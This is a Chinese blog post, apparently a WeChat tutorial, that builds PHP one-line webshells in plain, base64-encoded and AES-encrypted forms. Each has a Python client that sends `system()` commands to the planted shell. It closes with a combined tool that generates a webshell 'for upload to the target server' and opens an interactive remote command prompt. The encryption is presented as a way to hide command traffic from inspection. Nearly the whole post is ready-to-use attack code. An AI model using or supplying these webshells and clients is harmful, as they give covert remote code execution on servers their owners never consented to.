> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2uWdG0yHMbcUzTWk1UlKaA)

<table width="677" style="visibility: visible;"><tbody style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><tr style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td width="557" valign="top" height="62" style="margin: 0px;padding: 5px 10px;outline: 0px;word-break: break-all;hyphens: auto;border-width: 1px;border-style: solid;border-color: rgb(221, 221, 221);max-width: 100%;visibility: visible;overflow-wrap: break-word !important;box-sizing: border-box !important;"><section style="margin: 0px 0px 15px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><strong style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系刘一手。</section><section style="margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

环境
--

phpstudy、python3.8

1、普通木马数据传输
----------

新建一个webshell.php文件，内容为一句话木马

```
<?php @eval($_POST['pass']);?>  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyMXLQibxIgBBBEzC9D5I1w8kQpsac9FLbCnh5Kb1VT5FuOZuOia5xPzBWbAUy1YMlDlDPlRdGiaTjPjQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)python编写一个接发端

```
import requests  
url=input('webshell_url:')  
pwd=input('webshell_pwd:')  
proxy = {  
    'http': '127.0.0.1:8080',  
    'https': '127.0.0.1:8080'  
}  
while True:  
    cmd=input('$')  
    if cmd == 'exit':  
        exit()  
    send = "system('" + cmd + "');"  
    data={pwd:send}  
    r=requests.post(url=url,data=data,proxies=proxy)  
    print(r.text)  

```

效果如下![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)burp抓包进行查看![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)发现是原始的没有经过任何加密的数据传输

2、base64加密数据传输
--------------

新建一个webshell.php文件，内容如下

```
<?php @eval(base64_decode($_POST['pass']));?>  

```

python编写一个接发端

```
import requests,base64  
url=input('webshell_url:')  
pwd=input('webshell_pwd:')  
proxy = {  
    'http': '127.0.0.1:8080',  
    'https': '127.0.0.1:8080'  
}  
while True:  
    cmd=input('$')  
    if cmd == 'exit':  
        exit()  
    send = "system('" + cmd + "');"  
    base64_send= base64.b64encode(send.encode('utf-8'))  
    data1={pwd:base64_send}  
    r=requests.post(url=url,data=data1,proxies=proxy)  
    print(r.text)  

```

效果如下![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)通过burp进行抓包查看![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)发现传输数据是经过base64加密的![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3、AES加密数据传输
-----------

新建一个webshell.php文件，内容如下

```
<?php  
$key='woshinibaba66666';  
$vi='nishiwoerzi66666';  
$rce=openssl_decrypt(base64_decode($_POST['pass']), "AES-128-CBC",$key,OPENSSL_RAW_DATA,$vi);  
$cmd=base64_decode($rec);  
@eval($rce);  
?>  

```

python编写一个接发端

```
import requests,base64  
from Crypto.Cipher import AES  
BLOCK_SIZE = 16  
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)  
unpad = lambda s: s[:-ord(s[len(s) - 1:])]  
key='woshinibaba66666'  
vi='nishiwoerzi66666'  
def AES_Encrypt(key, data):  
    data = pad(data)  
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))  
    encryptedbytes = cipher.encrypt(data.encode('utf8'))  
    encodestrs = base64.b64encode(encryptedbytes)  
    enctext = encodestrs.decode('utf8')  
    return enctext  
def AES_Decrypt(key, data):  
    data = data.encode('utf8')  
    encodebytes = base64.decodebytes(data)  
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))  
    text_decrypted = cipher.decrypt(encodebytes)  
    text_decrypted = unpad(text_decrypted)  
    text_decrypted = text_decrypted.decode('utf8')  
    print(text_decrypted)  
    return text_decrypted  
if __name__ == '__main__':  
    url = input('webshell_url:')  
    pwd = input('webshell_pwd:')  
    proxy = {  
        'http': '127.0.0.1:8080',  
        'https': '127.0.0.1:8080'  
    }  
    while True:  
        cmd=input('$')  
        if cmd == 'exit':  
            exit()  
        send = "system('" + cmd + "');"  
        data1={pwd:AES_Encrypt(key,send)}  
        r=requests.post(url=url,data=data1,proxies=proxy)  
        print(r.text)  

```

效果如下![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)通过burp抓包查看数据![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)利用AES在线解密进行查看，数据传输是经过AES-CBC加密的 

在线解密网址：http://tool.chacuo.net/cryptaes![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

整合代码
----

```
import requests,base64  
from Crypto.Cipher import AES  
BLOCK_SIZE = 16  
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)  
unpad = lambda s: s[:-ord(s[len(s) - 1:])]  
key='woshinibaba66666'  
vi='nishiwoerzi66666'  
def AES_Encrypt(key, data):  
    data = pad(data)  
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))  
    encryptedbytes = cipher.encrypt(data.encode('utf8'))  
    encodestrs = base64.b64encode(encryptedbytes)  
    enctext = encodestrs.decode('utf8')  
    return enctext  
def AES_Decrypt(key, data):  
    data = data.encode('utf8')  
    encodebytes = base64.decodebytes(data)  
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))  
    text_decrypted = cipher.decrypt(encodebytes)  
    text_decrypted = unpad(text_decrypted)  
    text_decrypted = text_decrypted.decode('utf8')  
    print(text_decrypted)  
    return text_decrypted  
if __name__ == '__main__':  
    print('----------------')  
    print('|1:普通传输      |\n|2:base64加密传输|\n|3:AES加密传输   |')  
    print('----------------')  
    print('说明:选择生成对应的webshell传到目标服务器')  
    use=input('[+] choice:')  
    if use =='1':  
        print("""<?php @eval($_POST['pass']);?>""")  
    if use =='2':  
        print("""<?php @eval(base64_decode($_POST['pass']));?>""")  
    if use =='3':  
        print("""<?php $key='woshinibaba66666';$vi='nishiwoerzi66666';$rce=openssl_decrypt(base64_decode($_POST['pass']), "AES-128-CBC",$key,OPENSSL_RAW_DATA,$vi);$cmd=base64_decode($rec);@eval($rce);?>""")  
    con=input('[+] continue(yes/no):')  
    if con =='no':  
        exit()  
    if con=='yes':  
        url = input('[+] webshell_url:')  
        pwd='pass'  
        while True:  
            data=''  
            cmd=input('[-] $:')  
            if cmd == 'exit':  
                exit()  
            send = "system('" + cmd + "');"  
            if use =='1':  
                data = {pwd:send}  
            if use =='2':  
                base64_send = base64.b64encode(send.encode('utf-8'))  
                data = {pwd: base64_send}  
            if use=='3':  
                AES_send=AES_Encrypt(key,send)  
                data={pwd:AES_send}  
            r=requests.post(url=url,data=data)  
            print(r.text)  

```

**推 荐 阅 读**

  

  

  

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247486916&idx=1&sn=984c77b45bd8cd9d4c18e6d4e48f7a77&chksm=c01cc154f76b4842794057c17d6d4d2b53d511086f7a1b2179f18b013ecb10d0130b11e21b30&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247484227&idx=1&sn=9a75c274d878cff798b7939bbde81cc6&chksm=c01ccfd3f76b46c56fd931ef3298b890ad38c11a292e8a8e5925399177535798e1bf57aabbe6&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg5NDU3NDA3OQ==&mid=2247486647&idx=1&sn=1bff4578d5a5be7f2b61256ed936bf87&chksm=c01cc027f76b4931bea1c2da2de5c2efc81198b2a592c11c69cf12bf46a4ec77ff4de2aac74a&scene=21#wechat_redirect)

* * *

**欢 迎 加入学习**

  

  

  

  

机器人md5解密丫  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)